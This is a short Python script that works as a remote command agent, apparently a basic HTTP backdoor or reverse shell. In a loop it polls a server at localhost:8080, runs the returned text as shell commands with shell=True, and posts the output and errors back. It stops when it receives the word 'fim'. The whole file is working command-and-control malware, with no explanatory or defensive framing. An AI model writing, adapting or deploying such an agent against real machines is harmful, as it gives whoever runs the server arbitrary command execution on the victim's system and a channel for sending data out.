import requests  
import subprocess 
import time


while True: 

    req = requests.get('http://localhost:8080')      
    command = req.text                             
        
    if 'fim' in command:
        break 

    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://localhost:8080', data=CMD.stdout.read() )
        post_response = requests.post(url='http://localhost:8080', data=CMD.stderr.read() )  

    time.sleep(3)
    



